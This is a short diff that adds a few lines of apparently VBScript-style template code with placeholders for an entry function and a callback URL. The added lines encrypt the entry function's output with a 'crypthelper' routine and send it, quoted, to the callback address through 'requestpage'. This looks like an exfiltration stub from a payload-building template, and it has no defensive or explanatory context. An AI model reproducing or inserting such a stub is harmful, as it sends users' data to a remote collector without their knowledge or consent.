@@ -1,0 +1,4 @@
+
+Ohm = ""
+Ohm = crypthelper({{ENTRY}}(), ay, True)
+rul = requestpage("{{ CALLBACKURL }}", chr(34) & Ohm & chr(34))
